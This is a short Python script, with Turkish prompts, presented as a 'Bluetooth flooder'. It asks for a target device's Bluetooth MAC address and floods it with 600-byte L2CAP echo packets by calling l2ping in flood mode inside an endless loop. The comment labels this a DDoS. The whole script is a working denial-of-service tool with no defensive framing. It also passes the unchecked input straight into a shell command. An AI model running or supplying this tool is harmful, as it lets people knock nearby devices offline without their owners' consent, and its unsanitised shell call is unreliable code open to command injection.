import os
import time

print("--- BLUETOOTH FLOODER (L2CAP) ---")

target_mac = input("Hedef BT MAC: ")

print(f"🔥 {target_mac} cihazına paket basılıyor...")

try:
    while True:
        # l2ping komutu ile Flood (DDoS)
        # -f: Flood, -s: Paket boyutu
        os.system(f"l2ping -i hci0 -s 600 -f {target_mac}")
except KeyboardInterrupt:
    print("Durduruldu.")